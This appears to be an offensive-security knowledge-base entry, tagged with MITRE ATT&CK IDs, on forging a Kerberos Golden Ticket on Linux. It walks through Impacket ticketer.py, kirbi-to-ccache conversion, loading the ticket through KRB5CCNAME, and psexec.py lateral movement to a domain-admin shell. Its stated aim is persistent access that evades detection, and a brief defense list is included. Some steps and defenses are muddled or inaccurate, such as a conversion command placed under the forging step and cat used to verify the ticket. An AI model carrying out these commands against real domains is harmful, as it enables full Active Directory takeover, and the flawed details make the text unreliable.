---
type: procedure
description: >-
  This procedure demonstrates how to forge a Golden Ticket Kerberos ticket on a
  Linux system using tools like Impacket's ticketer and Kekeo, convert it to a
  usable ccache format, and leverage it for lateral movement via psexec.
verified: true
submitted: false
created_at: '2023-04-06T03:56:04.808331+00:00'
updated_at: '2023-04-10T20:26:04.537794+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Golden-Ticket|T1558.001 - Golden Ticket]]'
  - '[[techniques/Pass the Ticket|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Kerberos Tickets]]'
  - '[[tags/Pass-the-Ticket Golden Tickets]]'
  - '[[tags/Using a ticket on Linux]]'
commands:
  - '[[commands/kekeo-convert-kirbi-to-ccache]]'
  - '[[commands/impacket-ticketer-forge-golden-ticket]]'
  - '[[commands/set-krb5ccname-environment-variable]]'
  - '[[commands/display-krb5ccname-contents]]'
  - '[[commands/impacket-psexec-with-kerberos-ticket]]'
  - '[[commands/ticket-converter-ccache-to-kirbi]]'
  - '[[commands/ticket-converter-kirbi-to-ccache]]'
platforms:
  - Linux
  - Windows
tools:
  - '[[tools/Impacket]]'
  - '[[tools/kekeo]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Forge-and-Use-Golden-Ticket-on-Linux

## Summary

This procedure outlines the process of forging a Golden Ticket—a forged Kerberos TGT using the KRBTGT account's NTLM hash—to impersonate a domain administrator on a Linux system. It covers ticket creation with Impacket's ticketer or Kekeo, conversion between kirbi and ccache formats for Linux compatibility, setting the Kerberos credential cache, and using the ticket for remote execution via psexec. This enables persistent, undetected access to Active Directory resources.

## Description

A Golden Ticket attack exploits Kerberos by forging a Ticket Granting Ticket (TGT) with domain admin privileges, bypassing normal authentication. On Linux, this requires converting Windows-compatible kirbi tickets to ccache format, which Linux Kerberos tools recognize. The attack assumes the attacker has obtained the KRBTGT NTLM hash (e.g., via DCSync) and domain SID. Once forged, the ticket allows pass-the-ticket attacks for lateral movement, resource access, and persistence without further credential prompts. This is particularly effective in hybrid environments where Linux systems interact with Windows AD domains. Success grants full domain compromise, enabling data exfiltration or further escalation.

## Requirements

1. KRBTGT account NTLM hash (obtained via DCSync or similar).
2. Domain SID and target domain name.
3. Access to a Linux machine with Impacket suite, Kekeo, and ticket_converter.py installed.
4. Network access to the domain controller (e.g., via VPN or compromised host).
5. Kirbi ticket file if starting from a Windows-exported format.

## Defense

- Monitor for anomalous Kerberos ticket requests, especially TGTs with extended lifetimes or unusual user agents.
- Implement protected users group to restrict TGT issuance and enable ticket signing.
- Use advanced auditing for Kerberos events (Event ID 4769) and detect tools like Impacket via process monitoring.
- Rotate KRBTGT hash regularly and deploy LAPS for account security.
- Network segmentation to limit Linux-to-DC communications.

## Objectives

1. Forge a valid Golden Ticket impersonating a domain admin.
2. Convert and load the ticket into Linux Kerberos cache for use.
3. Achieve lateral movement to remote Windows systems using the ticket.
4. Verify persistent domain access without alerting defenses.

## Instructions

### Step 1: Forge Golden Ticket Using Kekeo or Impacket Ticketer

**Context**: Create the initial Golden Ticket in kirbi format using the KRBTGT hash. Use Kekeo for direct conversion or Impacket's ticketer.py for scripting. This step requires the domain SID, domain name, and target user (e.g., Administrator).

**Command** ([[commands/kekeo-convert-kirbi-to-ccache]]):
```bash
misc::convert ccache ticket.kirbi
```

> This converts an existing kirbi to ccache if needed, but for forging, use ticketer first.

**Command** ([[commands/impacket-ticketer-forge-golden-ticket]]):
```bash
./ticketer.py -nthash $_KRBTGT_NTHASH -domain-sid $_DOMAIN_SID -domain $_DOMAIN_NAME $_USERNAME -extra-sid $_ENTERPRISE_SID
```

> Replace placeholders with actual values (e.g., -nthash e65b41757ea496c2c60e82c05ba8b373). Expected output: A new kirbi file (e.g., admin.kirbi) containing the forged TGT. Verify with klist or similar.

**Expected Output**: Forged ticket file created, e.g., "Ticket created and saved to admin.kirbi".

### Step 2: Convert Kirbi Ticket to Ccache Format for Linux

**Context**: Linux Kerberos uses ccache; convert the kirbi using ticket_converter.py or Kekeo to make it usable.

**Command** ([[commands/ticket-converter-kirbi-to-ccache]]):
```bash
python ticket_converter.py $_KIRBI_FILE $_CCACHE_FILE
```

> Input kirbi (e.g., admin.kirbi), output ccache (e.g., admin.ccache). This handles format compatibility between Windows and Linux.

**Expected Output**: "Converting kirbi => ccache" followed by the new ccache file.

### Step 3: Set Kerberos Credential Cache Environment

**Context**: Point the Kerberos library to the converted ccache file for authentication.

**Command** ([[commands/set-krb5ccname-environment-variable]]):
```bash
export KRB5CCNAME=$PWD/$_CCACHE_FILE
```

> Use the full path to the ccache. This loads the ticket for subsequent operations.

**Expected Output**: No output; verify with `echo $KRB5CCNAME` showing the path.

### Step 4: Verify and Display Ticket Contents

**Context**: Inspect the ccache to confirm the ticket details (e.g., validity period, principal).

**Command** ([[commands/display-krb5ccname-contents]]):
```bash
cat $KRB5CCNAME
```

> Displays binary contents; for human-readable, use `klist $KRB5CCNAME` if available.

**Expected Output**: Binary ticket data; success if no errors and file exists.

### Step 5: Use Ticket for Lateral Movement with Psexec

**Context**: Leverage the Golden Ticket to execute commands remotely on a target Windows machine via the domain controller.

**Command** ([[commands/impacket-psexec-with-kerberos-ticket]]):
```bash
./psexec.py -k -no-pass -dc-ip $_DC_IP $_DOMAIN/$_USERNAME@$_TARGET_IP
```

> The -k flag uses the Kerberos ticket; no password needed. Expected: Remote shell or command execution as domain admin.

**Expected Output**: Successful connection, e.g., "Impacket v0.9.24 - Copyright 2020 SecureAuth Corporation" followed by remote prompt.
